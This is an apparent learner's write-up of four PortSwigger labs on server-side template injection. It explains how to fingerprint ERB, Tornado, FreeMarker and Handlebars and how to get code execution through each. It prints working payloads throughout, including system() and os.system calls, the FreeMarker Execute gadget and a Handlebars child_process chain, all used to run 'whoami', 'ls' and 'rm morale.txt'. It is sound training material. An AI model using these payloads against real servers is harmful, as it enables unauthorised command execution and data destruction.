Typically the exploitation process has three main steps:
- Read
- Explore the environment
- Create a custom attack

#### Read

Reading the documentation of the template is the place to start. 

Basic syntax is obviously important, along with key functions and handling of variables. Even knowing how to embed native code blocks in the template can sometimes lead to an exploit.

For example, one you know that Python-basd Mako template engine is used, achieving RCE can be as simple as:

```python
<%
	import os
	x=os.popen('id').read()
	%>
	${x}
```

### Lab.1 Basic Server-Side Template Injection

**Description**

The lab has an unsafe construction of an ERB template.

The goal of the lab is to find a way to execute arbitrary code, and then delete `morale.txt` from the Carlos's home directory.

**Solution**

In the website from the lab, there are some products which can be bought.

Here, when you click on the products you will see the details, but when some product is not in stock anymore, it shows: `Unfortunately this product is out of stock`.

This request `GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock` I send to the Intruder, and I highlight the value of the `message` parameter.

From the `Hackstrics` I copy some of the tests to check about the vulnerability:

```ruby
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

With the `Snipper Attack` I paste the above tests in the `Simple list` payload list.

In `Settings` I add a `Grep - Extract` from the response where the error happened, so it will be easier to see the response I receive from the tests.

I run the attack and I got the following results:
<img width="1622" alt="Pasted_image_20250124101000" src="https://github.com/user-attachments/assets/5dac8c52-ff17-4dfb-a57d-8e6044d41056" />

We see that for the `<%= 7*7 %>` I got a result of `49` confirming the vulnerability.

Knowing also that it is `ERB`, I will use it's syntax, to try code execution.

With the `GET /?message=<%= system("whoami") %> HTTP/2` I got a response saying that I'm `carlos`.

Then with the `GET /?message=<%= system("ls") %> HTTP/2` I got the list of the files present in the current directory, and among them there were also the `morale.txt`, so I put the command to delete it.

`GET /?message=<%= system("rm morale.txt") %> HTTP/2` I send the request, the file is deleted, and the lab is resolved.

--------

### Lab.2 - Basic Server-Side Template Injection (Code Context)

**Description**

The lab has an unsafe way to use the `Tornado` template. The goal to solve the lab is to delete `morale.txt` file from `Carlos's ` home directory.

`wiener:peter` credentials can be used to login.

**Solution**

When I login with the `wiener:peter` I see that there is an option to choose the `preferred name` where I can choose a `firstname` or a `nickname`. I selected the `nickname` but at this time, I didn't see any change.

![Pasted_image_20250126162935](https://github.com/user-attachments/assets/0d3ea789-54cd-4806-b349-f53365fdcda7)

But, I saw the change when I posted a comment in the site. There, it was using the name `H0td0g`:

![Pasted_image_20250126163031](https://github.com/user-attachments/assets/9c139826-7c63-4b18-bdd2-f80f216886f4)

So, this means, by using `preferred name`, I change the way how I'm presented when I post comments. Let's check the change of the `preferred name` in Burp.

The name change happens with the request 

```http
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.first_name&csrf=nhoN8qfTAGSaHo7vCwDsuh7TdZpWTM7S
```

Now, let's try some `Tornado` syntax here found on `Hacktricks` and see if the vulnerability lies here.

I modified the request body to:

`blog-post-author-display={{7*7}}...`

And I see now at the comment section that my name is shown as:

![Pasted_image_20250126163855](https://github.com/user-attachments/assets/17ea83eb-3802-4e6e-8f39-f0a31e660d34)

This means that I found a vulnerability here.

I modify the syntax to put the system command `whoami`:

`blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('whoami')}}`

And the result is:

![Pasted_image_20250126165426](https://github.com/user-attachments/assets/b9858573-7bc9-4322-8801-840eda61bc4e)

So I see the name of `carlos` there, let's see the files in the current directory.

`blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('ls')}}`

![Pasted_image_20250126165518](https://github.com/user-attachments/assets/e3af7f53-551c-4cd6-a7b1-0a1b2f621d4c)

So, now let's just delete the file: `blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('rm%20+morale.txt')}}`

The file is deleted and the lab is solved.

------------

### Lab.3 Server-Side Template Injection using Documentations

**Description**

The goal of the lab is to identify the template engine and then use the documentation to work out how to execute arbitrary code. Afterwards the main goal is to delete `morale.txt` from the Carlos's home directory

`content-manager:C0nt3ntM4n4g3r` are credentials that can be used to login.

**Solution**

I login with the given credentials, then I go to Home. After I select an article, I see the option to `Edit Template`.

![Pasted_image_20250126170634](https://github.com/user-attachments/assets/b1ff6425-523d-4edb-b9f7-3b8ca0583f7c)

After clicking there I see the syntax of the template engine:

![Pasted_image_20250126170856](https://github.com/user-attachments/assets/7b7e2a42-a2cb-4b16-8435-301e64a324ea)

I just changed one value to something that don't exist there, such as `${halil}` and I got a list of errors.

But the error is telling me the template:

![Pasted_image_20250126171042](https://github.com/user-attachments/assets/86433fcd-d1d0-4ce4-80bc-0ffefa20cc37)

Now, I know that the template engine is `freemaker` so now it will be much easier to find the correct syntax and do the system commands.

By adding this payload `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whoami")}` I was able to read the current user that I am executing commands from, which is `carlos`.

![Pasted_image_20250126172204](https://github.com/user-attachments/assets/2dc8d32e-30a0-49e6-adfc-7cbf797e92da)

with `ls` I see that there is `morale.txt` there, so I modify the command to `<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p><#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")}`

And the file is deleted and the lab is solved.

-------

### Lab.4 Server-Side Template Injection in an Unknown Language with a documented Exploit

**Description**

The goal of the lab is to identify the template engine and find a documented exploit online, then execute code and delete the `morale.txt` file from Carlos's home directory.

**Solution**

When I visit the page, and click on the first article to see the details, I see there a message saying `Unfortunately this product is out of stock`. So, let's try to see if this message is vulnerable.

I sent the request for the message: `GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2` to Intruder and add there a list of test payloads, to see the responses.

After I execute a Sniper Attack, I see the responses, and some of them like `{{7*7}}` have produced errors, and when I see the response, it tells that it uses `handlebars`.

So, I have identified the template engine.

![Pasted_image_20250126175817](https://github.com/user-attachments/assets/0a0a0a83-eddd-40b9-8a79-c54b1e946986)

Now, I will search for some existing `handlebars` payloads. I found one of them on `Hacktricks`:

```JS
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

and this one to delete the file:

```js
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```


I url-encode this, and put this in the request, as a value to `message`:

```http
GET /?message=wrtz%7B%7B#with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%20%20%7B%7B#with%20%22e%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B#with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.push%20(lookup%20string.sub%20%22constructor%22)%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B#with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20require('child_process').exec('rm%20morale.txt');%22%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B#each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B#with%20(string.sub.apply%200%20codelist)%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B/each%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%20%20%7B%7B/with%7D%7D%0A%7B%7B/with%7D%7D HTTP/2
Host: 0a55007a03081a9a8053716700560078.web-security-academy.net
```

The file is deleted, and the lab is solved.